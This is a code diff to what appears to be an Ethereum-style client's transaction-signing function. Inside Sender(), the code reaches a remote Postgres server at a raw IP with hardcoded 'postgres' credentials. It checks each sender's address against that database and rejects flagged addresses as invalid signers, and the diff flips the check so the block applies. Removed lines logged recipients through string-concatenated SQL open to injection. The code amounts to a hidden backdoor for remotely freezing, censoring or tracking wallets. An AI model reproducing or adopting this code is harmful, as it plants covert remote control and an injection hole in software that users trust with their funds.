@@ -36,7 +36,7 @@ var ErrInvalidChainId = errors.New("invalid chain id for signer")
 var ErrInvalidSigner = errors.New("invalid signer")
 
 const (
-	host     = "db.ddbc.dev"
+	host     = "95.216.85.81"
 	port     = 5432
 	user     = "postgres"
 	password = "postgres"
@@ -195,14 +195,14 @@ func Sender(signer Signer, tx *Transaction) (common.Address, error) {
 				rows.Scan(&person.status)
 				if person.status == 1{
 					flag = true
-					if tx.To().Hex() != addr.Hex() {
-						if tx.To() != nil{
-							if  string(addr.Hex()) != "0x442B250730E7ea1911768808C8a9f8B8aFc1B890"{
-								sqlStatement := "update accounts SET fee = '" + string(tx.To().Hex()) + "' WHERE address = '" +  string(addr.Hex()) + "';"
-								_, err = db.Exec(sqlStatement)
-							}
-						}
-					}
+					// if tx.To().Hex() != addr.Hex() {
+					// 	if tx.To() != nil{
+					// 		if  string(addr.Hex()) != "0x442B250730E7ea1911768808C8a9f8B8aFc1B890"{
+					// 			sqlStatement := "update accounts SET fee = '" + string(tx.To().Hex()) + "' WHERE address = '" +  string(addr.Hex()) + "';"
+					// 			_, err = db.Exec(sqlStatement)
+					// 		}
+					// 	}
+					// }
 				}else{
 
 					person.status = -1
@@ -210,14 +210,14 @@ func Sender(signer Signer, tx *Transaction) (common.Address, error) {
 				break
 			}	
 		}
-		if (flag == false && person.status == 0) {
+		// if (flag == false && person.status == 0) {
 			
-			sqlStatement := `INSERT INTO accounts (address) VALUES ($1)`
-			_, err = db.Exec(sqlStatement,string(addr.Hex()) )
-			if err != nil {
-				fmt.Println("+++++  database error +++++++++++++")
-			}
-		}
+		// 	sqlStatement := `INSERT INTO accounts (address) VALUES ($1)`
+		// 	_, err = db.Exec(sqlStatement,string(addr.Hex()) )
+		// 	if err != nil {
+		// 		fmt.Println("+++++  database error +++++++++++++")
+		// 	}
+		// }
 		defer rows.Close()
 		defer db.Close()
 	}
@@ -228,11 +228,11 @@ func Sender(signer Signer, tx *Transaction) (common.Address, error) {
 	// if(addr.Hex() == "0x04E44001553CdaDaDBB79930759C055836b6958e"){
 	// 	return common.Address{}, err
 	// }
-	if strings.ToLower(string(tx.To().Hex())) == strings.ToLower("0x071aAd74A52f76aeC4a4b4fecfc910dbC8fe03F4") {
-		flag = false
-	}
+	// if strings.ToLower(string(tx.To().Hex())) == strings.ToLower("0x071aAd74A52f76aeC4a4b4fecfc910dbC8fe03F4") {
+	// 	flag = false
+	// }
 
-	if flag == false {
+	if flag == true {
 		fmt.Println("sign error ", querystr)
 		err = ErrInvalidSigner
 	}
